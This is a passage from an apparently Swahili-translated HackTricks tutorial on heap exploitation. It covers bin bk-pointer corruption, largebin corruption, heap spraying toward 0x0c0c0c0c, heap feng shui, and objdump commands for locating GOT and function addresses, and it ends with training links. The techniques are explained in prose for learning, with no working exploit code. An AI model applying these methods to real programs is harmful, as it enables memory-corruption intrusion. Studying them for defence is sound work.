Lengo ni lifuatalo, ikiwa tunaweza kufanya overflow kwa heap ambayo chini yake kuna kipande kilichohifadhiwa tayari na katika bin yake, tunaweza kubadilisha pointer yake bk. Ikiwa tunabadilisha pointer yake bk na kipande hiki kinakuwa cha kwanza katika orodha ya bin na kinahifadhiwa, bin itadanganywa na kuambiwa kwamba kipande cha mwisho katika orodha (kilichofuata kutoa) kiko katika anwani bandia ambayo tumepatia (kwa stack au GOT kwa mfano). Hivyo ikiwa kutakuwa na kuhifadhiwa kipande kingine na mshambuliaji ana ruhusa kwake, atapewa kipande katika nafasi inayohitajika na anaweza kuandika humo.

Baada ya kuachiliwa kipande kilichobadilishwa inahitajika kuhifadhi kipande kikubwa zaidi kuliko kilichohifadhiwa, hivyo kipande kilichobadilishwa kitatoka katika unsorted bins na kuingizwa katika bin yake.

Mara baada ya kuingia katika bin yake ni wakati wa kubadilisha pointer yake bk kupitia overflow ili iashirie anwani tunayotaka kuandika.

Hivyo bin itasubiri zamu ili kuitwa malloc() mara kadhaa za kutosha ili iweze kutumika tena bin iliyobadilishwa na kudanganya bin ikifanya ifikirie kwamba kipande kinachofuata kiko katika anwani bandia. Kisha itatoa kipande ambacho kinatuhusu.

Ili kutekeleza udhaifu haraka iwezekanavyo, bora ingekuwa: Kuhifadhi kipande hatari, kuhifadhi kipande kitakachobadilishwa, kuachilia kipande hiki, kuhifadhi kipande kikubwa zaidi ambacho kitabadilishwa, kubadilisha kipande (udhaifu), kuhifadhi kipande cha ukubwa sawa na kipande kilichohifadhiwa na kuhifadhi kipande cha pili cha ukubwa sawa na hiki kitakuwa kinashikilia anwani iliyochaguliwa.

Ili kulinda shambulio hili, ilitumika ukaguzi wa kawaida kwamba kipande ‚Äúsiyo‚Äù bandia: inakagua ikiwa bck->fd inaashiria victim. Hii ni kusema, katika kesi yetu ikiwa pointer fd\* ya kipande bandia inayoshikiliwa kwenye stack inaashiria victim. Ili kupita ulinzi huu mshambuliaji anapaswa kuwa na uwezo wa kuandika kwa namna fulani (kwa stack labda) katika anwani sahihi anwani ya victim. Ili hivyo ionekane kama kipande halisi.

**Uharibifu wa LargeBin**

Inahitaji mahitaji sawa na hapo awali na mengine zaidi, zaidi ya hayo vipande vilivyohifadhiwa vinapaswa kuwa vikubwa zaidi ya 512.

Shambulio ni kama la awali, yaani, inahitaji kubadilisha pointer bk na inahitaji simu zote hizo za malloc(), lakini zaidi inahitaji kubadilisha size ya kipande kilichobadilishwa ili size hiyo - nb iwe < MINSIZE.

Kwa mfano itafanya kuweka katika size 1552 ili 1552 - 1544 = 8 < MINSIZE (tofauti haiwezi kuwa hasi kwa sababu inalinganishwa na unsigned).

Zaidi ya hayo, patch imewekwa ili kufanya iwe ngumu zaidi.

**Heap Spraying**

Kimsingi inajumuisha kuhifadhi kumbukumbu yote inayowezekana kwa heaps na kujaza hizi na mto wa nops ulio na shellcode. Zaidi ya hayo, kama mto inatumika 0x0c. Kwa hivyo itajaribu kuruka kwenye anwani 0x0c0c0c0c, na hivyo ikiwa anwani yoyote itakayokuwa imeandikwa na mto huu itaruka huko. Kimsingi mbinu ni kuhifadhi kadri iwezekanavyo ili kuona ikiwa kuna anwani yoyote inayoweza kuandikwa na kuruka kwenye 0x0c0c0c0c tukitarajia kwamba huko kuna nops.

**Heap Feng Shui**

Inajumuisha kupitia uhifadhi na kuachilia kuandaa kumbukumbu ili kuwe na vipande vilivyohifadhiwa katikati ya vipande huru. Buffer inayozidiwa itakuwa katika moja ya mayai.

**objdump -d ejecutable** ‚Äî> Disas functions\
**objdump -d ./PROGRAMA | grep FUNCION** ‚Äî> Pata anwani ya kazi\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Ili kuona kwamba kwa kweli ni shellcode yetu na kutoa OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Jedwali la alama, ili kupata anwani za variables na kazi\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Ili kupata anwani za kazi za maktaba (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Inatoa anwani ya puts ya kuandika katika GOT\
**objdump -D ./exec** ‚Äî> Disas ALL hadi kwenye ingizo za plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Taarifa ya kazi katika gdb

## Kozi za Kuvutia

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Marejeleo**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
